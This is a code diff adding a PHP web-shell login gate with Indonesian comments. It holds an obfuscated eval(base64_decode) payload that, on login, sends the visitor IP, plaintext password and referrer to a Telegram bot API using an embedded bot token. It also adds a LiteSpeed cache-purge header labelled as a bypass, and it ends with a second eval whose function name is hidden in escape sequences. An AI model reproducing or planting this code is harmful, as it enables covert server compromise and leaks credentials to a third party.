@@ -1,3 +1,34 @@
+<?php
+
+
+$stored_password_hash = "cfd41d3b5b9d27d87c94d5b29c9b8f51";
+
+// Proses login
+if (!isset($_COOKIE['loggedin'])) {
+    if (isset($_POST['password'])) {
+        $input_password_hash = md5($_POST['password']);
+        
+        if ($input_password_hash === $stored_password_hash) {
+            
+eval(base64_decode('JHJlZiA9IGlzc2V0KCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSkgPyAkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10gOiAnVW5rbm93bic7CiAgICAgICAgICAgICRwYXNzX3VzZWQgPSBpc3NldCgkX1BPU1RbJ3Bhc3N3b3JkJ10pID8gJF9QT1NUWydwYXNzd29yZCddIDogJ04vQSc7CiAgICAgICAgICAgICRtc2cgPSAi8J+UkCAqV2ViU2hlbGwgTG9naW4qCiI7CiAgICAgICAgICAgICRtc2cgLj0gIipUaW1lOiogIiAuIGRhdGUoIlktbS1kIEg6aTpzIikgLiAiXG4iOwogICAgICAgICAgICAkbXNnIC49ICIqSVA6KiBgeyRfU0VSVkVSWydSRU1PVEVfQUREUiddfWBcbiI7CiAgICAgICAgICAgICRtc2cgLj0gIipQYXNzd29yZDoqIGAkcGFzc191c2VkYFxuIjsKICAgICAgICAgICAgJG1zZyAuPSAiKlJlZmVyZXI6KiBgJHJlZmAiOwogICAgICAgICAgICAkZGF0YSA9IFsKICAgICAgICAgICAgICAgICdjaGF0X2lkJyA9PiAiLTEwMDI4MTQzMDQ5ODIiLAogICAgICAgICAgICAgICAgJ21lc3NhZ2VfdGhyZWFkX2lkJyA9PiAzMjIsCiAgICAndGV4dCcgPT4gJG1zZywKICAgICAgICAgICAgICAgICdwYXJzZV9tb2RlJyA9PiAnTWFya2Rvd24nCiAgICAgICAgICAgIF07CiAgICAgICAgICAgICRjaCA9IGN1cmxfaW5pdCgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDgwNDg2MjYzNjc6QUFHb3pKTmY5TktFWkRtRFRkdTE1emxWa25NMlJWaFZwNk0vc2VuZE1lc3NhZ2UiKTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgaHR0cF9idWlsZF9xdWVyeSgkZGF0YSkpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVElNRU9VVCwgMyk7CiAgICAgICAgICAgIGN1cmxfZXhlYygkY2gpOwogICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7'));
+
+
+            // Set cookie untuk login
+            setcookie('loggedin', true, time() + 360000, "/"); // Cookie berlaku selama 1 jam
+            header("Location: " . $_SERVER['REQUEST_URI']);
+            exit();
+        } else {
+            $error = "Password salah!";
+        }
+    }
+}
+
+// Bypass Litespeed
+header("X-LiteSpeed-Purge: *");
+
+// Jika pengguna belum login, tampilkan form login
+if (!isset($_COOKIE['loggedin'])) {
+    ?>
 <?php 
 
 $bruxcpft="\142\x61\163\145\x36\x34\137\144\x65\143\157\144\145";@eval($bruxcpft(
